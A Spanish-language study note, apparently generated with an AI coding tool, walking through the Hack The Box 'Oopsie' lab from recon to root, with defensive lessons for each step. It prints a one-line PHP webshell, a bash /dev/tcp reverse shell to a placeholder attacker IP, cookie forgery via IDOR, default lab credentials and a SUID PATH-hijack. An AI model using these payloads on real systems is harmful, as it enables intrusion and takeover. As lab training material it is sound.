---
title: Oopsie (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, idor, upload-bypass, webshell, suid, path-hijacking, linux]
type: nota
status: en-progreso
source: claude-code
aliases: [oopsie, HTB Oopsie, oopsie htb]
---

# Oopsie — HTB Starting Point (Tier 2)

**Tier 2 · SO: Linux · Dificultad: Very Easy · Skills: IDOR, Upload Bypass, RCE, SUID / PATH Hijacking**

Oopsie encadena cuatro vulnerabilidades en secuencia: un fallo de control de acceso por objeto (IDOR) para escalar privilegios en la aplicación web, un bypass de validación de subida de archivos para obtener ejecución remota, credenciales en un archivo de configuración expuesto, y un binario SUID mal programado para escalar a root. Es el laboratorio canónico de la cadena "web foothold → credenciales en disco → privesc SUID".

> Este laboratorio es parte del Starting Point de Hack The Box, un entorno de aprendizaje legal y autorizado. No aplicar estas técnicas fuera de entornos con permiso explícito.

---

## Objetivo

Obtener acceso como `www-data` mediante webshell, pivotar a `robert` con credenciales en disco, y escalar a `root` abusando de un binario SUID con PATH hijacking. Recolectar `user.txt` y `root.txt`.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoría: escaneo de puertos y detección de servicios.**

```bash
nmap -sV -sC -oN oopsie.nmap <IP>
```

Resultado relevante esperado:

```
22/tcp  open  ssh     OpenSSH ...
80/tcp  open  http    Apache httpd ...
```

Solo HTTP (80) y SSH (22). La superficie de ataque empieza en el navegador.

---

## Enumeración

**Categoría: enumeración web — rutas ocultas y comportamiento de autenticación.**

Abre `http://<IP>/` en el navegador. Aparece una página de empresa de automóviles con un enlace a `/cdn-cgi/login`. Navega ahí: es un panel de login.

Prueba las credenciales por defecto del sistema (las que dejó la máquina anterior del tier, Archetype / otros SP):

```
admin / MEGACORP_4dm1n!!
```

> Si las credenciales varían en tu instancia, revisa la máquina anterior del tier o el panel de hints de HTB. La técnica es la misma independientemente del valor concreto.

Tras autenticar, explora la aplicación. El parámetro `id` en la URL cambia qué perfil se muestra:

```
http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=1
```

---

## Acceso inicial (foothold)

### Paso 1 — IDOR: obtener la cookie de super admin

**Categoría: IDOR (Insecure Direct Object Reference) — A01 OWASP Top 10.**

El servidor confía en el parámetro `id` de la URL para decidir qué datos mostrar, sin verificar que el usuario autenticado tenga derecho a ver ese objeto. Cambia el valor de `id` para enumerar otros perfiles:

```
http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=2
http://<IP>/cdn-cgi/login/admin.php?content=accounts&id=30
...
```

Uno de los perfiles revelará el `Access ID` del rol **super admin**. Apunta ese valor (un número distinto al tuyo).

Edita tu cookie de sesión en el navegador (DevTools → Application → Cookies o con una extensión como Cookie-Editor):

```
user=<access_id_superadmin>
role=super admin
```

Recarga la página. Ahora tienes acceso al panel de uploads.

### Paso 2 — Upload bypass: subir una webshell PHP

**Categoría: validación de subida insuficiente en servidor.**

El panel permite subir archivos pero rechaza `.php` directamente. Prueba extensiones alternativas que Apache/PHP puede ejecutar:

```
shell.php5
shell.phtml
shell.phar
```

Contenido mínimo de la webshell:

```php
<?php system($_GET['cmd']); ?>
```

Sube el archivo. Si el servidor rechaza alguna extensión, prueba la siguiente de la lista. Cuando acepte, busca la ruta donde queda almacenado (normalmente indicada en la respuesta o en `/uploads/`).

### Paso 3 — RCE y reverse shell

**Categoría: Remote Code Execution vía webshell.**

Verifica ejecución:

```
http://<IP>/uploads/shell.phar?cmd=id
```

Respuesta esperada: `uid=33(www-data) ...`

Levanta un listener:

```bash
nc -lvnp 4444
```

Lanza la reverse shell (URL-encodea los `&` si los envías por el navegador, o usa Burp):

```bash
# payload (adaptar según lo que acepte el sistema)
bash -c 'bash -i >& /dev/tcp/<TU_IP>/4444 0>&1'
```

Enviado como:

```
http://<IP>/uploads/shell.phar?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<TU_IP>/4444+0>%261'
```

Ya tienes shell como `www-data`.

---

## Escalada de privilegios

### Fase 1 — Credenciales en config → usuario robert

**Categoría: secretos en ficheros de configuración de la aplicación.**

Enumera los archivos de la aplicación web buscando credenciales:

```bash
find /var/www -name "*.php" | xargs grep -l "password\|db_pass\|DB_PASS" 2>/dev/null
```

En algún fichero `config.php` (ruta aproximada `/var/www/html/.../config.php`) encontrarás algo como:

```php
$db_user = "robert";
$db_pass = "<contraseña_en_vivo>";
```

Usa esas credenciales para cambiar al usuario `robert`:

```bash
su robert
# introduce la contraseña encontrada
```

`user.txt` suele estar en `/home/robert/user.txt`:

```bash
cat /home/robert/user.txt
# <flag>
```

### Fase 2 — SUID + PATH hijacking → root

**Categoría: binario SUID con llamada a comando sin ruta absoluta.**

Busca binarios con bit SUID activo:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Verás `/usr/bin/bugtracker` (o similar). Ejecútalo para observar su comportamiento:

```bash
bugtracker
```

El binario llama a `cat` sin ruta absoluta (ejecuta `cat /root/root.txt` internamente usando solo `cat`). Esto permite PATH hijacking: creamos un `cat` falso en un directorio que colocamos antes en el PATH.

```bash
# 1. Crear un directorio bajo nuestro control
mkdir /tmp/fakepath

# 2. Crear el "cat" falso que lanza una shell
echo '/bin/bash' > /tmp/fakepath/cat
chmod +x /tmp/fakepath/cat

# 3. Poner ese directorio primero en el PATH
export PATH=/tmp/fakepath:$PATH

# 4. Ejecutar el binario SUID
bugtracker
```

El binario SUID ejecuta `/tmp/fakepath/cat` con privilegios de root → obtienes shell como `root`.

> Alternativa si el binario simplemente imprime el archivo: puede que el PATH hijacking te dé directamente el contenido de `root.txt` sin necesidad de shell interactiva. Verifica el comportamiento real contra la máquina en vivo.

```bash
cat /root/root.txt
# <flag>
```

---

## Flags

| Flag | Ubicación típica | Cómo se obtiene |
|---|---|---|
| `user.txt` | `/home/robert/user.txt` | Tras pivotar a robert con credenciales del config.php |
| `root.txt` | `/root/root.txt` | Tras PATH hijacking del binario SUID |

---

## Patron y teoria

Esta máquina es el ejemplo canónico de una **cadena de ataque web-a-root de cuatro eslabones**. Cada eslabón es un error de diseño independiente; encadenados, van de visitante anónimo a root.

### Eslabón 1 — IDOR (Control de acceso por objeto)

**Patrón**: el servidor usa un identificador controlable por el cliente (`?id=N`) para acceder a objetos sin verificar que el usuario autenticado tiene autorización sobre ese objeto concreto.

**Defensa / diseño**:
- Nunca confiar en IDs de URL/cookie para tomar decisiones de autorización.
- Cada consulta al objeto debe verificar en servidor: `SELECT ... WHERE id=? AND owner_id=session.user_id`.
- Usar UUIDs opacos en lugar de enteros secuenciales reduce la enumerabilidad pero no elimina el fallo si no hay verificación.
- Ver [[04-seguridad-web-owasp]] — A01 Broken Access Control.

### Eslabón 2 — Bypass de validación de subida

**Patrón**: la aplicación valida la extensión del archivo en cliente o con una lista negra incompleta. El atacante prueba extensiones alternativas que el servidor ejecuta igualmente (`.phar`, `.phtml`, `.php5`).

**Defensa / diseño**:
- Lista blanca de tipos MIME verificados en servidor (no confiar en el Content-Type del cliente).
- Almacenar uploads **fuera del webroot** o en un directorio sin permisos de ejecución.
- Renombrar el archivo con un nombre opaco (UUID) al guardarlo, independientemente de la extensión original.
- Usar un servicio de almacenamiento externo (S3, etc.) que nunca ejecuta archivos.

### Eslabón 3 — Credenciales en ficheros de configuración expuestos

**Patrón**: las credenciales de base de datos se guardan en texto plano en un `config.php` dentro del webroot o accesible desde el sistema de archivos una vez que hay RCE.

**Defensa / diseño**:
- Variables de entorno o un gestor de secretos (Vault, AWS Secrets Manager) en lugar de archivos con credenciales en disco.
- Si se usan archivos, situarlos fuera del webroot y con permisos `640` (solo el usuario de la app puede leerlos).
- Principio de mínimo privilegio: el usuario de BD solo debe tener los permisos que necesita (no `root`/`admin` de BD).

### Eslabón 4 — Binario SUID con PATH hijacking

**Patrón**: un binario con bit SUID llama a otro programa (aquí `cat`) usando solo su nombre, sin ruta absoluta. Si el atacante controla el PATH, puede sustituir ese programa por uno malicioso que se ejecuta con privilegios elevados.

**Defensa / diseño**:
- En código C/scripts que necesiten SUID, usar siempre rutas absolutas (`/bin/cat`, `/usr/bin/find`).
- Minimizar la cantidad de binarios con SUID; auditar periódicamente con `find / -perm -4000`.
- Considerar Linux Capabilities como alternativa más granular al SUID completo.
- Ver [[06-seguridad-de-sistemas-y-hardening]] — sección SUID/GTFOBins.

### Vista de conjunto (purple team)

```
Visitante anónimo
  → IDOR en parámetro id → cookie superadmin
  → Upload bypass → webshell PHP → RCE como www-data
  → Config.php en disco → credenciales → su robert
  → Binario SUID + PATH hijacking → root
```

Cada paso es prevenible de forma independiente. Si cualquiera de los cuatro controles estuviera en su lugar, la cadena se rompe.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[04-seguridad-web-owasp]]
- [[06-seguridad-de-sistemas-y-hardening]]
